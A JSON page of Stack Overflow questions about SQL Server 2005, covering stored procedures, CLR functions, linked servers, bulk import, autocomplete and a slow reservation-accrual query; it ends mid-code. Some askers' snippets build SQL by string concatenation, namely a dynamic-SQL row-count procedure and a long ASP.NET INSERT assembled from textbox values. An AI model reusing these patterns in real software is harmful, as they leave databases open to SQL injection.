{"total":14387,"page":13,"pagesize":100,"questions":[{"tags":["sql-server-2005","stored-procedures"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":11716478,"title":"Stored procedures with count and output parameters","body":"<p>Please help me.How to execute this procedure.</p>\n\n<pre><code>create procedure rowcounts \n@TableName nvarchar(350),\n@tot int output\nas\nbegin\ndeclare @sql nvarchar(Max)\nset @sql='Select count(*) as ['+@tot+'] from ['+@TableName+']'\nexec (@sql)\nend\n\ndeclare @totals int\nexec rowcounts, @tot=@totals output\n</code></pre>\n\n<p>Error:Msg 137, Level 15, State 2, Line 1\n      Must declare the scalar variable \"@totals\".</p>\n"},{"tags":["sql-server-2005","clr"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":73,"score":2,"question_id":11709216,"title":"Running an exe with in a CLR method for Sql Server 2005","body":"<p>I wrote a CLR method for sql server 2005 and trying to run an exe through it. <br/></p>\n\n<p>Here is the code:<br/><br/></p>\n\n<pre><code>[Microsoft.SqlServer.Server.SqlFunction]\n    public static SqlString Function1()\n    {\n        System.Diagnostics.Process.Start(\"notepad.exe\");\n        return new SqlString(\"Some string \");\n    }\n</code></pre>\n\n<p>After deploying when I try to run this CLR method in sql server 2005 it gives me following error:</p>\n\n<pre><code> Msg 6522, Level 16, State 2, Line 1\n    A .NET Framework error occurred during execution of user defined routine or aggregate 'Function1': \n    System.Security.SecurityException: Request failed.\n    System.Security.SecurityException: \n       at UserDefinedFunctions.Function1()\n</code></pre>\n\n<p><br/><br/> Is it possible to run an exe like this ? </p>\n"},{"tags":["sql-server-2005","sybase","linked-server"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":75,"score":0,"question_id":11714062,"title":"LinkedServer error 7352 to Sybase ASA9 when deleting","body":"<p>I have a linked server configured in SQL Server 2005 connected to Sybase using ODBC ASA9.</p>\n\n<p>I'm trying to execute a delete using the code below.</p>\n\n<pre><code>DELETE FROM openquery([LINKSVR],'SELECT X1 FROM [LINKSVR].[DBNAME].[schema].tablName where 1=1');\n</code></pre>\n\n<p>But I'm receiving the the following error</p>\n\n<p>Msg 7352, Level 16, State 1, Line 1\nThe OLE DB provider \"ASAProv.90\" for linked server \"LINKSVR\" supplied inconsistent metadata. The object \"(user generated expression)\" was missing the expected column \"Bmk1000\".</p>\n\n<p>Does anyone have any idea how could I resolve this?</p>\n\n<p>Many thanks.</p>\n"},{"tags":["sql","sql-server-2005","iis-7.5"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":488,"score":0,"question_id":11680283,"title":"how to fix Windows NT user or group 'IIS APPPOOL\\DefaultAppPool' not found?","body":"<p>when I run on sql server 2005:</p>\n\n<pre><code>EXEC sp_grantlogin \"IIS APPPOOL\\DefaultAppPool\"\n</code></pre>\n\n<p>I get the error:</p>\n\n<pre><code>Msg 15401, Level 11, State 1, Procedure sp_grantlogin, Line 49\nWindows NT user or group 'IIS APPPOOL\\DefaultAppPool' not found. Check the name again.\n</code></pre>\n\n<p>How can I fix this?</p>\n"},{"tags":["sql","sql-server-2005","case-when"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":115,"score":1,"question_id":11689681,"title":"SQL Case When Statement with multiple lines","body":"<p>Is there a way to make this SQL smaller?</p>\n\n<pre><code>CASE\n                    WHEN @contentType = 'PrimaryBannerItem' THEN\n                        [dbo].[DeathStar_GetContentLink]         (@contentId, c.content_id, @pageCollectionId, ISNULL(l.filename, ''))\n\n                    ELSE\n\n                        [dbo].[DeathStar_GetContentImagePath](ISNULL(a.mimetype, ''), ISNULL(c.image, ''), ISNULL(l.filename, ''))\n                END AS [Image],\n\n                CASE\n                    WHEN @contentType = 'PrimaryBannerItem' THEN\n                         dbo.DeathStar_GetMetadataValue(c.content_id, @urlMetadataId)\n\n\n                    ELSE\n\n                        [dbo].[DeathStar_GetContentLink](@contentId, c.content_id, @pageCollectionId, ISNULL(l.filename, ''))\n                END AS Link,\n</code></pre>\n\n<p>To make it look more like</p>\n\n<pre><code>CASE\n    WHEN @contentType = 'PrimaryBannerItem' THEN\n        [dbo].[DeathStar_GetContentLink](@contentId, c.content_id, @pageCollectionId, ISNULL(l.filename, '')) as [Image]\n        dbo.DeathStar_GetMetadataValue(c.content_id, @urlMetadataId) as [Link]\n    ELSE\n        [dbo].[DeathStar_GetContentImagePath](ISNULL(a.mimetype, ''), ISNULL(c.image, ''), ISNULL(l.filename, '')) as [Image]\n        [dbo].[DeathStar_GetContentLink](@contentId, c.content_id, @pageCollectionId, ISNULL(l.filename, '')) as [Link]\nEND\n</code></pre>\n\n<p>Because as you can see, it makes the code a bit more readable, it cuts down on the number of lines used and it avoid redundancy.</p>\n"},{"tags":["sql","sql-server-2005","sql-server-2008","ssis"],"answer_count":6,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":4540,"score":5,"question_id":1924435,"title":"Sql server Integration Services 2008-2005 compatibility","body":"<p>I recently developed an SSIS package on my dev machine using the 2008 version.\nLater I foud the customer had Sql server 2005 and doesn't plan to upgrade anytime soon.</p>\n\n<p>Is there a way to turn the 2008 package into a SSIS 2005 package, like a downgrade wizard? </p>\n"},{"tags":["c#","asp.net","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":8663982,"title":"Error occur after hosting- \"Object reference not set to an instance\"","body":"<p>I am new to .net.  I am using Asp.net 3.5 framework C# and SQLSERVER 2005</p>\n\n<p><img src=\"http://i.stack.imgur.com/TixIe.png\" alt=\"This error is not occur when I run it in local machine. but after hosting it I got this error. What will be the reason?\"></p>\n\n<p>This is my code..</p>\n\n<pre><code>    c.Procexenonquery(\"Insert into Applicationform values('\" + txt_app_id.Text.Replace(\"'\", \"''\") + \"','\" + drp_salutation.SelectedItem.Text.Replace(\"'\", \"''\") + \"','\" + txt_name.Text.Replace(\"'\", \"''\") + \"','\" + txt_dateofbirth.Text.Replace(\"'\", \"''\") + \"','\" + drp_gender.SelectedItem.Text.Replace(\"'\", \"''\") + \"','\" + txt_mothername.Text.Replace(\"'\", \"''\") + \"','\" + drp_martialstatus.SelectedItem.Text.Replace(\"'\", \"''\") + \"','\" + drp_ocupation.SelectedItem.Text.Replace(\"'\", \"''\") + \"','\" + txt_email.Text.Replace(\"'\", \"''\") + \"','\" + txt_commaddress.Text.Replace(\"'\", \"''\") + \"','\" + drp_commcountry.SelectedItem.Text.Replace(\"'\", \"''\") + \"','\" + drp_commstate.SelectedItem.Text.Replace(\"'\", \"''\") + \"','\" + drp_comcity.SelectedItem.Text.Replace(\"'\", \"''\") + \"','\" + txt_compincode.Text.Replace(\"'\", \"''\") + \"','\" + txt_comlandline.Text.Replace(\"'\", \"''\") + \"','\" + txt_commmob.Text.Replace(\"'\", \"''\") + \"','\" + path1.Replace(\"'\", \"''\") + \"','\" + txt_permaddress.Text.Replace(\"'\", \"''\") + \"','\" + drp_permcountry.SelectedItem.Text.Replace(\"'\", \"''\") + \"','\" + drp_permstate.SelectedItem.Text.Replace(\"'\", \"''\") + \"','\" + drp_permcity.SelectedItem.Text.Replace(\"'\", \"''\") + \"','\" + txt_permpincode.Text.Replace(\"'\", \"''\") + \"','\" + txt_permlandline.Text.Replace(\"'\", \"''\") + \"','\" + txt_permmob.Text.Replace(\"'\", \"''\") + \"','\" + path2.Replace(\"'\", \"''\") + \"','\" + drp_nominee_salut.SelectedItem.Text.Replace(\"'\", \"''\") + \"','\" + txt_nominame.Text.Replace(\"'\", \"''\") + \"','\" + txt_nomieedob.Text.Replace(\"'\", \"''\") + \"','\" + drp_nomineegender.SelectedItem.Text.Replace(\"'\", \"''\") + \"','\" + drp_nomieerelation.SelectedItem.Text.Replace(\"'\", \"''\") + \"','\" + txt_nom_address.Text.Replace(\"'\", \"''\") + \"','\" + drp_nom_country.SelectedItem.Text.Replace(\"'\", \"''\") + \"','\" + drp_nom_state.SelectedItem.Text.Replace(\"'\", \"''\") + \"','\" + drp_nom_city.SelectedItem.Text.Replace(\"'\", \"''\") + \"','\" + txt_nom_pin.Text.Replace(\"'\", \"''\") + \"','\" + txt_nom_landline.Text.Replace(\"'\", \"''\") + \"','\" + txt_nom_mob.Text.Replace(\"'\", \"''\") + \"','\" + txt_pancardno.Text.Replace(\"'\", \"''\") + \"','\" + path3.Replace(\"'\", \"''\") + \"','\" + path4.Replace(\"'\", \"''\") + \"')\");\n</code></pre>\n\n<p>The QuickView of my code is...</p>\n\n<pre><code>Insert into Applicationform \nvalues\n('A1','Mr.','sam','12/12/2011','M','mary','Single','Salaried','sam1@gmail.com',\n'terr','TN','SN','VN','685591','00000000','00000000',\n'com_addressproof/3-yrs-valid-address-proof-card.jpg','ERT','TN','SN','VN','685591',\n'00000000','00000000','perm_addressproof/address proof_thumb[2].jpg','Mr.','JERRY','12/29/2011',\n'M','Brother','house no.','TN','SN','AN','685591','00000000','00000000','1111111111',\n'pancard/adress-proof-card.jpg','photo/close_link.png')\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":3,"view_count":60,"score":-2,"question_id":11708212,"title":"how to sum all field select statement to be one row?","body":"<p>i have problem with my sql. i try sum max number in my statement to be one row but it's doesn't works. the warning message show Incorrect syntax near ')'. \nthis is my code:-</p>\n\n<pre><code>select sum(A) from (select t.ticketid, lt.description ticketsource,\nc.description tickedcreted,\nmax_score = isnull(\n(select max(si.marks) as max_score\nfrom survey_items si\nleft join survey_questions sq on (si.question_id = sq.question_id)\nleft join survey s on (sq.survey_id = s.survey_id\nand s.code_interaction= 1)),0\n),\nsum(si.marks) totalAnswer,\n\ncount(t.ticketid) totalticketcreated,\ncount(t.feedback) totalfeedbackreceived\nfrom  survey_items si\nleft join lookup_questions lq on (si.item_id = lq.item_id)\nleft join feedback fb on (fb.feedback_id = lq.feedback_id)\nleft join ticket t on (t.ticketid = fb.ticketid)\nleft join survey_questions sq on (si.question_id = sq.question_id)\nleft join survey s on (sq.survey_id = s.survey_id)\nleft join lookup_assignedOfficer c on (c.code = t.enteredby )\nleft join lookup_department ld on t.department_code =ld.code\nleft join lookup_ticketsource lt on lt.code = s.code_interaction\nwhere t.trashed_date is null and lt.enabled =1 and ld.description is not null\nand\n((t.assigned_date BETWEEN '7/16/2012' AND '7/16/2012'))\n)\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":7,"favorite_count":6,"up_vote_count":45,"down_vote_count":0,"view_count":133665,"score":45,"question_id":334108,"title":"How do I check if a Sql server string is null or empty","body":"<p>I want to check for data but ignore it if it's null or empty. Currently the query is as follows...</p>\n\n<pre><code>Select              \nCoalesce(listing.OfferText, company.OfferText, '') As Offer_Text,         \nfrom tbl_directorylisting listing  \n Inner Join tbl_companymaster company            \n  On listing.company_id= company.company_id\n</code></pre>\n\n<p>But I want to get company.OfferText if listing.Offertext is an empty string, as well as if it's null.</p>\n\n<p>What's the best performing solution?</p>\n"},{"tags":["sql-server-2005","bulk-import"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":11699223,"title":"How to import data with double quotes in SQL Server 2005","body":"<p>I have to import a text file with data which contains double quotes. Actually I have created a text file which contains aix commands and their explanation. </p>\n\n<p>Now the commands contains double quotes. So using the regular approach of importing bulk data into SQL Server 2005 I am getting error.</p>\n\n<p>My text file is like:</p>\n\n<pre><code>1,acledit \"file\",for changing the ACL(access control list) of a file\n2,anacheck -ap,error analysing for Escala E + T\n3,bsh,starts a born shell\n4,cancel \"print job number\",for killing a print job\n5,chgrp \"group\" \"file\",changes the group of a file\n6,chitab \"inittab statement\",for disabling a statement of the /etc/inittab\n7,chmod 0777 \"file\",gives everybody the right to read, write and execute the specified file\n8,chown \"user\" \"file\",changes the owner of a file\n9,compress -v \"file\",compresses a file\n10,cplv,copies a logical volume (no mirroring)\n</code></pre>\n\n<p>Can someone plz guide me how to import this data as it is in SQL Server 2005?</p>\n"},{"tags":["sql-server","sql-server-2005","tsql","aggregation"],"answer_count":7,"favorite_count":1,"up_vote_count":11,"down_vote_count":0,"view_count":1112,"score":11,"question_id":3981050,"title":"Aggregate bitwise-OR in a subquery","body":"<p>Given the following table:</p>\n\n<pre><code>CREATE TABLE BitValues ( n int )\n</code></pre>\n\n<p>Is it possible to compute the bitwise-OR of <code>n</code> for all rows <i>within a subquery</i>? For example, if BitValues contains these 4 rows:</p>\n\n<pre>\n+---+\n| n |\n+---+\n| 1 |\n| 2 |\n| 4 |\n| 3 |\n+---+\n</pre>\n\n<p>I would expect the subquery to return 7. Is there a way to do this inline, <i>without creating a UDF</i>?</p>\n"},{"tags":["java","sql","sql-server-2005","jdbc"],"answer_count":2,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":178,"score":2,"question_id":11694068,"title":"How does PreparedStatement.executeQuery work?","body":"<p>How <code>PreparedStatement.executeQuery</code> works? Does it fetch results from database and I loop through them? Or it fetches the first result, and on record.next continues with sql query to the next row?</p>\n\n<pre><code>ResultSet record = statement.executeQuery(\"select * from users\");\n    while (record.next()) {\n    //do something\n}\n</code></pre>\n\n<p>thank you</p>\n"},{"tags":["c#","jquery","asp.net","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":553,"score":1,"question_id":11680792,"title":"Jquery AutoComplete with database","body":"<p>I cannot seem to figure out what is wrong with the code for the autocomplete search bar.</p>\n\n<p>The only thing I can think of is that I referenced the wrong thing under URL</p>\n\n<p>aspx Javascript </p>\n\n<p></p>\n\n<pre><code>    $(document).ready(function() {\n        SearchText();\n    });\n    function SearchText() {\n        $(\".ui-autocomplete\").autocomplete({\n            source: function(request, response) {\n                $.ajax({\n                    type: \"POST\",\n                    contentType: \"application/json; charset=utf-8\",\n                    url: \"Admin_home.aspx/GetAutoCompleteData\",\n                    data: \"{'Car':'\" + document.getElementById('query').value + \"'}\",\n                    dataType: \"json\",\n                    success: function(data) {\n                        response(data.d);\n                    },\n                    Error: function(results) {\n                        alert(\"Error\");\n                    }\n                });\n            }\n        });\n    }\n\n&lt;/script&gt;`\n</code></pre>\n\n<p>aspx html code</p>\n\n<p>I cant seem to type or paste the html here.  It is just a<br>\nasp:Textbox ID=\"query\" class=\"ui.autocomplete\"</p>\n\n<p>c# code  </p>\n\n<pre><code>    [WebMethod]\n    public static List&lt;string&gt; GetAutoCompleteData(string Car)\n    {\n        List&lt;string&gt; result = new List&lt;string&gt;();\n        using (SqlConnection con = new SqlConnection(System.Configuration.ConfigurationManager.ConnectionStrings[\"CarsConnectionString\"].ConnectionString))\n        {\n            using (SqlCommand cmd = new SqlCommand(\"select DISTINCT Car from T_Car where Car like '%'+ @SearchText +'%\", con))\n            {\n                con.Open();\n                cmd.Parameters.AddWithValue(\"@SearchText\", Car);\n                SqlDataReader dr = cmd.ExecuteReader();\n                while (dr.Read())\n                {\n                    result.Add(dr[\"Car\"].ToString());\n                }\n                return result;\n            }\n        }\n    }\n</code></pre>\n\n<p>Would part of the html need to be wrapped in an AJAX update panel?</p>\n\n<p>Also, I am having the search pull names from sql server 2005.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":179,"score":-1,"question_id":11691735,"title":"(sql server 2005) How to determine the WEEK number starting from GETDATE()","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/348880/getting-week-number-off-a-date-in-ms-sql-server-2005\">Getting week number off a date in MS SQL Server 2005?</a>  </p>\n</blockquote>\n\n\n\n<p>Please suppose (i am in Italy) that all the weeks start with <code>Monday</code> and end with <code>Sunday</code>.</p>\n\n<p>I would like to write a scalar valued function that determines the <code>number of the week</code> with reference to <code>GETDATE()</code></p>\n\n<p>Thank you in advance for your kind cooperation.</p>\n\n<p>PLEASE PAY ATTENTION TO THIS: The SELECT has to be INDIPENDENT from the SET DATEFIRST command!!</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":65,"score":1,"question_id":11693214,"title":"How I can assign the result of a query to multiple variables at once without use a cursor?","body":"<p>When I need to store the result of a SQL sentence in a variable I can use a code like so</p>\n\n<pre><code>declare @Max as int\nset @Max=(select max(field_name) from table_name)\n</code></pre>\n\n<p>But now i wondering if is possible do the same for multiple variables for example for a sentence like </p>\n\n<pre><code>select max(field_name), min(field_name) from table_name\n</code></pre>\n\n<p>how i can store the result in two variables called  @Max and @Min? </p>\n\n<p>I know which this can be done using cursors </p>\n\n<pre><code>DECLARE @Max as int, @Min as int\nDECLARE cursor_minmax CURSOR FOR\nSelect max(field_name), min(field_name) from table_name\nOPEN cursor_minmax \nFETCH NEXT FROM cursor_minmax  INTO @Max,@Min\nCLOSE cursor_minmax \nDEALLOCATE cursor_minmax \n</code></pre>\n\n<p>but i want to know if is possible assign that values wihout use cursors.</p>\n"},{"tags":["sql-server","sql-server-2005","full-text-search","wildcard","fulltext"],"answer_count":5,"favorite_count":0,"up_vote_count":7,"down_vote_count":0,"view_count":6037,"score":7,"question_id":295266,"title":"Full text catalog/index search for  %book% ","body":"<p>I'm trying to wrap my head around how to search for something that appears in the middle of a word / expression - something like searching for \"LIKE %book% \" - but in SQL Server (2005) full text catalog.</p>\n\n<p>How can I do that? It almost appears as if both <code>CONTAINS</code> and <code>FREETEXT</code> really don't support wildcard at the <strong>beginning</strong> of a search expression - can that really be?</p>\n\n<p>I would have imagined that <code>FREETEXT(*, \"book\")</code> would find anything with \"book\" inside, including \"rebooked\" or something like that. </p>\n"},{"tags":["c#","sql-server-2005","clr"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":219,"score":2,"question_id":3519121,"title":"List serialization in CLR aggregation function C#","body":"<p><br>\nI'm trying to add an aggregation function into SQL server 2005 via C#. But when I deploy the project it fails with the following error: </p>\n\n<blockquote>\n  <p>.Net SqlClient Data Provider: Msg 6222, Level 16, State 1, Line 1 Type \"AggregationTest.CountNonintersectingIntervals\" is marked for native serialization, but field \"intervals\" of type \"AggregationTest.CountNonintersectingIntervals\" is not valid for native serialization</p>\n</blockquote>\n\n<p>Here's the code I'm using:</p>\n\n<pre><code>[Serializable]\n[Microsoft.SqlServer.Server.SqlUserDefinedType(Format.Native)]\npublic struct Interval : INullable\n{\n\n    public Interval(int beginning, int ending) : this()\n    {\n        this.beginning = beginning;\n        this.ending = ending;\n    }\n\n    public override string ToString()\n    {\n        return \"(\" + beginning + \", \" + ending + \")\";\n    }\n\n    public bool IsNull { get { return m_Null; } }\n\n    public static Interval Null { get { /*Some code*/ } }\n\n    public static Interval Parse(SqlString s)\n    {\n         /*Some code*/\n    }\n\n    public int beginning;\n    public int ending;\n    private bool m_Null;\n}\n\n[Serializable]\n[Microsoft.SqlServer.Server.SqlUserDefinedAggregate(Format.Native)]\npublic struct CountNonintersectingIntervals\n{\n    public void Init()\n    {\n        intervals = new List&lt;Interval&gt;();\n    }\n\n    public void Accumulate(Interval interval)\n    {\n        intervals.Add(interval);\n    }\n\n    public void Merge(CountNonintersectingIntervals Group)\n    {\n        intervals.AddRange(Group.intervals);\n    }\n\n    public SqlInt32 Terminate()\n    {\n        // Some complicated calculation using intervals\n    }\n\n    private List&lt;Interval&gt; intervals;\n}\n</code></pre>\n\n<p>Could you please help me to solve the problem</p>\n"},{"tags":["c#","asp.net","sql-server-2005","authentication"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":149,"score":0,"question_id":11689373,"title":"save username from login to another form","body":"<p>I need to save the user name in a sql table, example: an user\n  put it's user name and password in the login, then, in other form must\n  send some data in textboxes to another user, how can I save the username?\n  I'm working in a website with visual studio 2008, c sharp and sql server 2005, thanks<br>\n  in advance.</p>\n\n<p>this is my code in login and I have to pass the user name to the 2nd form</p>\n\n<pre><code>protected void btnLogin_Click(object sender, EventArgs e)\n\n{\n    ClPersona login = new ClPersona();\n    bool isAuthenticated = login.sqlLogin1((txtUsuario.Text), (txtPassword.Text));\n    if (isAuthenticated)\n    {\n        //prueba para sesion\n        Session[\"sesionicontrol\"] = login.NombreUsuario;\n        Response.Redirect(\"../MENU/menu1.aspx\");\n    }\n</code></pre>\n"},{"tags":["performance","sql-server-2005","pivot","unpivot","cross-apply"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":91,"score":0,"question_id":11672197,"title":"Improving performance for processing multiple days and returning summarized data","body":"<p>This is my first post.  I have a table of reservations and I need to calculate accrued nights and revenue by weekday and weekend for the current year and prior 3 years dynamically.\nThe following code returns the exact results needed but is very time consuming.  A test of a 6-day span took over a minute, and I need it to process over 1,400 days. In my research I've thought about processing a full year and using unpivot but I think it will still be timely.  Then one similar solution used cross apply, but I'm not sure how to apply such a method to this scenario.<br><br>\nCan you recommend a faster solution?</p>\n\n<pre><code>declare @reportEnd datetime, @periodStart datetime, @periodEnd datetime\ndeclare @year smallint, @qtr tinyint, @mth tinyint, @wkdy varchar(10), @extract datetime\n\n-- Parameters\nset @reportEnd = '01/01/'+cast(year(getdate())+1 as char(4)) --End of current year.\nset @periodStart = dateadd(yy,-3,'01/01/'+cast(year(getdate()) as char(4))) --Pull 3 years of history.\nset @periodEnd = dateadd(d,1,@periodStart)\nset @year = year(@periodStart)\nset @qtr = datepart(qq,@periodStart)\nset @mth = month(@periodStart)\nset @wkdy = case when datepart(dw,@periodStart) &gt; 5 then 'Weekend' else 'Weekday' end --Friday and Saturday.\nset @extract = dbo.mindate(dbo.yesterday(),'01/01/'+cast(@year+1 as char(4))) --Latest extract date for Actuals\n\n-- Create table\ndeclare @results table\n    (\n    acquisitionType varchar(50)\n    ,portfolioType varchar(10)\n    ,Region varchar(50)\n    ,PropertyState varchar(50)\n    ,SubRegion varchar(50)\n    ,Market varchar(50)\n    ,Season varchar(50)\n    ,[Property] varchar(50)\n    ,newRateClassGroup varchar(10)\n    ,nrcgSubGroup  varchar(10)\n    ,custType varchar(10)\n    ,[Year] smallint\n    ,Qtr tinyint\n    ,Mth tinyint\n    ,WkDy  varchar(10)\n    ,Rate varchar(10)\n    ,Scenario varchar(10)\n    ,Nts int\n    ,SaleAmt money\n    ,DiscAmt money\n    ,NetRev money\n    );\n\n-- Populate table\nwhile @periodStart &lt; @reportend\nbegin\ninsert into @results\n    select \n        acquisitionType = substring(CMDatamart.dbo.getAcquisitionType('01/01/2012',b.acquisitionType,1),2,20)\n        ,portfolioType = case when b.acquisitionType = 'TT Acquisitions' then 'TT' else 'ELS' end\n        ,Region = b.Region --d.name Region with MH/RV.\n        ,PropertyState = c.name\n        ,SubRegion = b.subregion\n        ,Market = e.name\n        ,Season = f.name\n        ,[Property] = b.name\n        ,newRateClassGroup\n        ,nrcgSubGroup = case when newRateClass = 'PM RENTAL INC' then 'Rental' else newRateClassGroup end\n        ,custType = case \n                    when \n                        oldSource = 'Member' \n                        or \n                        membershipId like '%[1-9]%'\n                        and membershipId not like '%[A-Z:.#-]%'\n                        and len(membershipId) = 9\n                    then 'Member'\n                    else 'Retail' end\n        ,[Year] = @year\n        ,Qtr = @qtr\n        ,Mth = @mth\n        ,WkDy = @wkdy\n        ,Rate = case when discountAmt != 0 then 'Discount' else 'Rack' end\n        ,Scenario = 'Actual'\n        ,Nts = dbo.accruedNights(arrivalDate,departureDate,@periodStart,@periodEnd)\n        ,SaleAmt = dbo.accruedRevenue(arrivalDate,departureDate,@periodStart,@periodEnd,saleAmt,nbrNights)\n        ,DiscAmt = dbo.accruedRevenue(arrivalDate,departureDate,@periodStart,@periodEnd,discountAmt,nbrNights)\n        ,NetRev = dbo.accruedRevenue(arrivalDate,departureDate,@periodStart,@periodEnd,saleAmt-discountAmt+otherAmt-taxincAmt,nbrNights)\n    from \n        CMRentRoll a\n            join Foundation.dbo.Property b on a.propertyId = b.propertyId\n            join Foundation.dbo.State c on b.stateId = c.stateId\n            join Foundation.dbo.PropertyRegion d on b.regionId = d.propertyRegionId \n            join Foundation.dbo.PropertyMarket e on b.marketId = e.propertyMarketId\n            join Foundation.dbo.PropertySeason f on b.seasonId = f.propertySeasonId\n    where  \n        @extract between extractfrom and extractTo\n        and newRateClassGroup in ('Annual','Seasonal','Transient')\n        and departureDate &gt; @periodStart\n        and arrivalDate &lt; @periodEnd\n\n    union all\n\n    select \n        acquisitionType = substring(CMDatamart.dbo.getAcquisitionType('01/01/2012',b.acquisitionType,1),2,20)\n        ,portfolioType = case when b.acquisitionType = 'TT Acquisitions' then 'TT' else 'ELS' end\n        ,Region = b.Region --d.name Region with MH/RV.\n        ,PropertyState = c.name\n        ,SubRegion = b.subregion\n        ,Market = e.name\n        ,Season = f.name\n        ,[Property] = b.name\n        ,newRateClassGroup\n        ,nrcgSubGroup = case when newRateClass = 'PM RENTAL INC' then 'Rental' else newRateClassGroup end\n        ,custType = case \n                    when \n                        oldSource = 'Member' \n                        or \n                        membershipId like '%[1-9]%'\n                        and membershipId not like '%[A-Z:.#-]%'\n                        and len(membershipId) = 9\n                    then 'Member'\n                    else 'Retail' end\n        ,[Year] = @year\n        ,Qtr = @qtr\n        ,Mth = @mth\n        ,WkDy = @wkdy\n        ,Rate = case when discountAmt != 0 then 'Discount' else 'Rack' end\n        ,Scenario = 'Pace'\n        ,Nts = dbo.accruedNights(arrivalDate,departureDate,@periodStart,@periodEnd)\n        ,SaleAmt = dbo.accruedRevenue(arrivalDate,departureDate,@periodStart,@periodEnd,saleAmt,nbrNights)\n        ,DiscAmt = dbo.accruedRevenue(arrivalDate,departureDate,@periodStart,@periodEnd,discountAmt,nbrNights)\n        ,NetRev = dbo.accruedRevenue(arrivalDate,departureDate,@periodStart,@periodEnd,saleAmt-discountAmt+otherAmt-taxincAmt,nbrNights)\n    from \n        CMRentRoll a\n            join Foundation.dbo.Property b on a.propertyId = b.propertyId\n            join Foundation.dbo.State c on b.stateId = c.stateId\n            join Foundation.dbo.PropertyRegion d on b.regionId = d.propertyRegionId \n            join Foundation.dbo.PropertyMarket e on b.marketId = e.propertyMarketId\n            join Foundation.dbo.PropertySeason f on b.seasonId = f.propertySeasonId\n    where  \n        dateadd(yy,@year-year(getdate()),dbo.yesterday()) between extractfrom and extractTo --Extract date for pace.\n        and newRateClassGroup in ('Annual','Seasonal','Transient')\n        and departureDate &gt; @periodStart\n        and arrivalDate &lt; @periodEnd\n\n    set @periodStart = dateadd(d,1,@periodStart)\n    set @periodEnd = dateadd(d,1,@periodStart)\n    set @year = year(@periodStart)\n    set @qtr = datepart(qq,@periodStart)\n    set @mth = month(@periodStart)\n    set @wkdy = case when datepart(dw,@periodStart) &gt; 5 then 'Weekend' else 'Weekday' end --Friday and Saturday.\n    set @extract = dbo.mindate(dbo.yesterday(),'01/01/'+cast(@year+1 as char(4))) --Latest extract date for Actuals\nend\n\n--Return results\nselect\n    acquisitionType\n    ,portfolioType\n    ,Region\n    ,PropertyState\n    ,SubRegion\n    ,Market\n    ,Season\n    ,[Property]\n    ,newRateClassGroup\n    ,nrcgSubGroup\n    ,custType\n    ,[Year]\n    ,Qtr\n    ,Mth\n    ,WkDy\n    ,Rate\n    ,Scenario\n    ,Nts = sum(Nts)\n    ,SaleAmt = sum(SaleAmt)\n    ,Discount = sum(DiscAmt)\n    ,NetRev = sum(NetRev)\nfrom\n    @results\ngroup by\n    acquisitionType\n    ,portfolioType\n    ,Region\n    ,PropertyState\n    ,SubRegion\n    ,Market\n    ,Season\n    ,[Property]\n    ,newRateClassGroup\n    ,nrcgSubGroup\n    ,custType\n    ,[Year]\n    ,Qtr\n    ,Mth\n    ,WkDy\n    ,Rate\n    ,Scenario\n</code></pre>\n\n<p>Here's the code with a small subset of sample data and expected output and truncated for an easier read.</p>\n\n<pre><code>create table t\n    (\n    [Property] varchar(50)\n    ,arrivalDate datetime\n    ,departureDate datetime\n    ,nbrNights int\n    ,saleAmt money\n    )\n\ninsert into t values ('A', '01/16/2012', '01/16/2013', 366, 4591.00)\ninsert into t values ('B', '11/01/2012', '04/01/2013', 151, 1640.00)\ninsert into t values ('C', '12/30/2012', '12/31/2012', 1, 2869.00)\ninsert into t values ('D', '12/01/2012', '01/01/2013', 31, 3000.00)\n\ndeclare @reportEnd datetime, @periodStart datetime, @periodEnd datetime\ndeclare @year smallint, @qtr tinyint, @mth tinyint, @wkdy varchar(10), @extract datetime\n\n-- Parameters\nset @reportEnd = '01/01/'+cast(year(getdate())+1 as char(4)) --End of current year.\nset @periodStart = dateadd(yy,-3,'01/01/'+cast(year(getdate()) as char(4))) --Pull 3 years of history.\nset @periodEnd = dateadd(d,1,@periodStart)\nset @year = year(@periodStart)\nset @qtr = datepart(qq,@periodStart)\nset @mth = month(@periodStart)\nset @wkdy = case when datepart(dw,@periodStart) &gt; 5 then 'Weekend' else 'Weekday' end --Friday and Saturday.\n\n-- Create table\ndeclare @results table\n    (\n    [Property] varchar(50)\n    ,[Year] smallint\n    ,Qtr tinyint\n    ,Mth tinyint\n    ,WkDy  varchar(10)\n    ,Nts int\n    ,SaleAmt money\n    );\n\n-- Populate table\nwhile @periodStart &lt; @reportend\nbegin\ninsert into @results\n    select \n        [Property]\n        ,[Year] = @year\n        ,Qtr = @qtr\n        ,Mth = @mth\n        ,WkDy = @wkdy\n        ,Nts = dbo.accruedNights(arrivalDate,departureDate,@periodStart,@periodEnd)\n        ,SaleAmt = dbo.accruedRevenue(arrivalDate,departureDate,@periodStart,@periodEnd,saleAmt,nbrNights)\n    from t\n\n    set @periodStart = dateadd(d,1,@periodStart)\n    set @periodEnd = 